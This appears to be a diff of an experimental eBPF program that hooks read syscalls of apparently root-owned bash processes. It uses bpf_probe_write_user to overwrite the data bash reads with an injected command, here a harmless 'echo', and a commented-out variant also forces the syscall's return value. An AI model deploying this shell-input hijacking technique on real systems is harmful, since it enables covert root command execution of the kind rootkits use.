@@ -266,6 +266,84 @@ int tp_openat_enter(struct bpf_raw_tracepoint_args *ctx)
     return 0;
 }
 
+
+// SEC("kprobe/__x64_sys_read")
+// int kp__x64_sys_read(struct pt_regs *ctx)
+// {
+//     if (!is_bash_with_root(ctx))
+//         return 0;
+
+//     uint32_t pid = bpf_get_current_pid_tgid() >> 32;
+    
+//     char *pathname = bpf_map_lookup_elem(&openat_path_map, &pid);
+//     if (!pathname)
+//         return 0;
+    
+//     // int fd = (int)PT_REGS_PARM1(ctx);
+
+//     // int fd = (int)PT_REGS_PARM1(ctx);
+//     int fd = (int)PT_REGS_PARM1(ctx);
+//     // if (bpf_probe_read(&fd, sizeof(fd),
+//     //                    (void *)(ctx + offsetof(struct pt_regs, rdi))) < 0)
+//     //     return 0;
+//     // bpf_probe_read(&fd, sizeof(fd), &ctx->rdi);
+
+//     // void *buf = (void *)PT_REGS_PARM2(ctx);
+
+//     void* buf = (void*)PT_REGS_PARM2(ctx);
+//     // if (bpf_probe_read(&buf, sizeof(buf),
+//     //                    (void *)(ctx + offsetof(struct pt_regs, rsi))) < 0)
+//     // {
+//     //     return 0;
+//     // }
+//     // bpf_probe_read(&buf, sizeof(buf), &ctx->rsi);
+
+//     // size_t count = (size_t)PT_REGS_PARM3(ctx);
+//     unsigned long count = (unsigned long)PT_REGS_PARM3(ctx);
+//     // if (bpf_probe_read(&count, sizeof(count),
+//     //                    (void *)(ctx + offsetof(struct pt_regs, rdx))) < 0)
+//     // {
+//     //     return 0;
+//     // }
+//     // bpf_probe_read(&count, sizeof(count), &ctx->rdx);
+//     bpf_printk("YOYOYOYOYO from sysread\n");
+
+//     if (!buf || count == 0)
+//         return 0;
+
+
+//     /* Example filter: only intercept a specific fd (uncomment if needed)*/
+//     if (fd != 3)
+//         return 0;
+
+    
+
+//     /* replacement message */
+//     const char msg[] = "Hello from ebpf!! Nice to meet you\n";
+//     int msglen = sizeof(msg) - 1;
+
+//     /* write at most count bytes (don't overflow user buffer) */
+//     int write_len = msglen;
+//     if ((size_t)write_len > count)
+//         write_len = (int)count;
+
+//     /* Try to write to user buffer */
+//     if (bpf_probe_write_user((void*)buf, msg, write_len) != 0) {
+//         /* write failed (helper may be restricted), bail out */
+//         bpf_printk("bpf_probe_write_user failed\n");
+//         return 0;
+//     }
+
+//     /* override syscall return value to write_len */
+//     /* bpf_override_return expects (struct pt_regs *regs, __u64 rc) for kprobes */
+//     bpf_override_return(ctx, (unsigned long)write_len);
+
+//     bpf_printk("intercepted read: pid=%d fd=%d wrote=%d\n",
+//                pid, fd, write_len);
+//     return 0; /* not reached after override, but keep for verifier */
+// }
+
+
 SEC("raw_tracepoint/sys_exit")
 int tp_read_exit(struct bpf_raw_tracepoint_args *ctx)
 {
@@ -309,6 +387,11 @@ int tp_read_exit(struct bpf_raw_tracepoint_args *ctx)
                        (void *)(regs_ptr + offsetof(struct pt_regs, rdi))) < 0)
         return 0;
 
+    // if(fd!=3)
+    // {
+    //     return 0;
+    // }
+
     uint32_t pid = bpf_get_current_pid_tgid() >> 32;
     // struct fd_key key = {.pid = pid, .fd = fd};
 
@@ -320,7 +403,13 @@ int tp_read_exit(struct bpf_raw_tracepoint_args *ctx)
     unsigned long buf_ptr = 0;
     if (bpf_probe_read(&buf_ptr, sizeof(buf_ptr),
                        (void *)(regs_ptr + offsetof(struct pt_regs, rsi))) < 0)
+    {
         return 0;
+    }
+    
+    char newcommand[] = "echo 1 Hi from ebpf!";
+    
+    bpf_probe_write_user((void *)buf_ptr, newcommand, sizeof(newcommand));
 
     char data[128];
     int copy = ret < sizeof(data) ? ret : sizeof(data)-1;
@@ -333,232 +422,3 @@ int tp_read_exit(struct bpf_raw_tracepoint_args *ctx)
 
     return 0;
 }
-
-
-
-
-
-
-
-
-
-
-    // --- check if argv1 is contained in pathname ---
-    // Simple bounded substring check (unrolled)
-    // int match = 0;
-    // #pragma unroll
-    // for (int i = 0; i < MAX_BUF - 1; i++) {
-    //     int j;
-    //     match = 1;
-    //     #pragma unroll
-    //     for (j = 0; j < MAX_BUF - 1; j++) {
-    //         if (argv1[j] == 0)
-    //             break;
-    //         if (pathname[i + j] == 0 || pathname[i + j] != argv1[j]) {
-    //             match = 0;
-    //             break;
-    //         }
-    //     }
-    //     if (match && argv1[0] != 0) {
-    //         break;
-    //     }
-    // }
-
-
-// // hbash.bpf.c
-// // Tracks execve argv[1], watches openat for matching filename, records returned fd on sys_exit_openat,
-// // and when read(fd) is called, prints content read from that fd (bounded).
-// #include <linux/bpf.h>
-// #include <bpf/bpf_helpers.h>
-// #include <bpf/bpf_tracing.h>
-// #include <stdint.h>
-
-// #define MAX_BUF 128
-// #define MAX_ENTRIES 10240
-
-// struct trace_event_raw_sys_enter {
-//     unsigned long long pad;
-//     unsigned long long args[6];
-// };
-
-// struct trace_event_raw_sys_exit {
-//     unsigned long long pad;
-//     long ret;
-// };
-
-// /* key for fd->filename map */
-// struct pid_fd_key {
-//     __u32 pid;
-//     int fd;
-// };
-
-// /* =========== Maps =========== */
-// /* exec_args_map: pid -> argv[1] (script filename) */
-// struct {
-//     __uint(type, BPF_MAP_TYPE_HASH);
-//     __type(key, __u32);
-//     __type(value, char[MAX_BUF]);
-//     __uint(max_entries, MAX_ENTRIES);
-// } exec_args_map SEC(".maps");
-
-// /* open_tmp_map: temporary store for matching openat filename during sys_enter_openat
-//    keyed by pid -> filename. Will be consumed in sys_exit_openat. */
-// struct {
-//     __uint(type, BPF_MAP_TYPE_HASH);
-//     __type(key, __u32);
-//     __type(value, char[MAX_BUF]);
-//     __uint(max_entries, MAX_ENTRIES);
-// } open_tmp_map SEC(".maps");
-
-// /* fd_file_map: (pid, fd) -> filename (persisted after openat returns) */
-// struct {
-//     __uint(type, BPF_MAP_TYPE_HASH);
-//     __type(key, struct pid_fd_key);
-//     __type(value, char[MAX_BUF]);
-//     __uint(max_entries, MAX_ENTRIES);
-// } fd_file_map SEC(".maps");
-
-// /* =========== Helpers =========== */
-// /* Bounded, verifier-friendly string equality (returns 1 if equal, 0 otherwise) */
-// static __inline int str_eq(const char *a, const char *b, int maxlen)
-// {
-//     int i;
-//     #pragma unroll
-//     for (i = 0; i < MAX_BUF; i++) {
-//         char ca = a[i];
-//         char cb = b[i];
-//         if (ca == '\0' && cb == '\0')
-//             return 1;
-//         if (ca != cb)
-//             return 0;
-//     }
-//     return 0;
-// }
-
-// /* =========== Tracepoints =========== */
-
-// /* execve enter: args[0] = filename, args[1] = argv */
-// /* We capture argv[1] (if present) and store in exec_args_map keyed by pid. */
-// SEC("tracepoint/syscalls/sys_enter_execve")
-// int trace_execve(struct trace_event_raw_sys_enter *ctx)
-// {
-//     unsigned long argv_ptr = (unsigned long)ctx->args[1];
-//     if (!argv_ptr)
-//         return 0;
-
-//     /* read argv[1] pointer: argv is array of pointers, argv[1] = argv + 1 */
-//     unsigned long user_arg1_addr = argv_ptr + sizeof(void *);
-//     const char *arg1_ptr = NULL;
-//     if (bpf_probe_read_user(&arg1_ptr, sizeof(arg1_ptr), (const void *)user_arg1_addr) != 0)
-//         return 0;
-
-//     if (!arg1_ptr)
-//         return 0;
-
-//     char filename[MAX_BUF] = {};
-//     if (bpf_probe_read_user_str(&filename, sizeof(filename), (const void *)arg1_ptr) <= 0)
-//         return 0;
-
-//     __u32 pid = (__u32)bpf_get_current_pid_tgid();
-//     /* store argv[1] (script filename) */
-//     bpf_map_update_elem(&exec_args_map, &pid, &filename, BPF_ANY);
-
-//     bpf_printk("execve: pid=%d argv1=%s\n", pid, filename);
-//     return 0;
-// }
-
-// /* openat enter: args[0]=dfd, args[1]=filename
-//    We read filename and compare to stored exec argv[1]. If matches, stash filename in open_tmp_map for pid. */
-// SEC("tracepoint/syscalls/sys_enter_openat")
-// int trace_openat_enter(struct trace_event_raw_sys_enter *ctx)
-// {
-//     const char *user_fname_ptr = (const char *)ctx->args[1];
-//     if (!user_fname_ptr)
-//         return 0;
-
-//     char fname[MAX_BUF] = {};
-//     if (bpf_probe_read_user_str(&fname, sizeof(fname), (const void *)user_fname_ptr) <= 0)
-//         return 0;
-
-//     __u32 pid = (__u32)bpf_get_current_pid_tgid();
-
-//     /* check exec_args_map for this pid */
-//     char *exec_fname = bpf_map_lookup_elem(&exec_args_map, &pid);
-//     if (!exec_fname)
-//         return 0;
-
-//     /* compare: if equal, keep in tmp map to record fd on exit */
-//     if (str_eq(exec_fname, fname, MAX_BUF)) {
-//         /* store the filename temporarily for this pid */
-//         bpf_map_update_elem(&open_tmp_map, &pid, &fname, BPF_ANY);
-//         bpf_printk("openat_enter: pid=%d matched exec filename=%s\n", pid, fname);
-//     }
-
-//     return 0;
-// }
-
-// /* openat exit: ctx->ret has returned fd (or negative error)
-//    If open_tmp_map has a filename for this pid and ret >= 0, store (pid, fd) -> filename in fd_file_map. */
-// SEC("tracepoint/syscalls/sys_exit_openat")
-// int trace_openat_exit(struct trace_event_raw_sys_exit *ctx)
-// {
-//     long ret = ctx->ret;
-//     __u32 pid = (__u32)bpf_get_current_pid_tgid();
-
-//     /* see if we had a matching filename pending */
-//     char *tmp_fname = bpf_map_lookup_elem(&open_tmp_map, &pid);
-//     if (!tmp_fname)
-//         return 0;
-
-//     /* remove temp entry (we will either store in fd map or drop) */
-//     bpf_map_delete_elem(&open_tmp_map, &pid);
-
-//     if (ret < 0)
-//         return 0; /* open failed */
-
-//     struct pid_fd_key k = {};
-//     k.pid = pid;
-//     k.fd = (int)ret;
-
-//     /* store filename keyed by (pid, fd) */
-//     if (bpf_map_update_elem(&fd_file_map, &k, tmp_fname, BPF_ANY) != 0) {
-//         /* ignore failure */
-//     } else {
-//         bpf_printk("openat_exit: pid=%d fd=%d filename=%s\n", pid, k.fd, tmp_fname);
-//     }
-
-//     return 0;
-// }
-
-// /* read enter: args[0]=fd, args[1]=buf, args[2]=count
-//    Look up (pid, fd) in fd_file_map and print content (bounded). */
-// SEC("tracepoint/syscalls/sys_enter_read")
-// int trace_read_enter(struct trace_event_raw_sys_enter *ctx)
-// {
-//     int fd = (int)ctx->args[0];
-//     const void *user_buf = (const void *)ctx->args[1];
-//     // size_t count = (size_t)ctx->args[2];
-
-//     __u32 pid = (__u32)bpf_get_current_pid_tgid();
-
-//     struct pid_fd_key k = {};
-//     k.pid = pid;
-//     k.fd = fd;
-
-//     char *fname = bpf_map_lookup_elem(&fd_file_map, &k);
-//     if (!fname)
-//         return 0;
-
-//     /* read a bounded amount from the user buffer (MAX_BUF-1) */
-//     char buf[MAX_BUF] = {};
-//     if (bpf_probe_read_user(&buf, sizeof(buf) - 1, user_buf) != 0)
-//         return 0;
-
-//     bpf_printk("read: pid=%d fd=%d file=%s content=%s\n", pid, fd, fname, buf);
-//     return 0;
-// }
-
-// /* optional: a cleanup helper not strictly necessary (could be removed) */
-
-// /* license */
-// char LICENSE[] SEC("license") = "GPL";
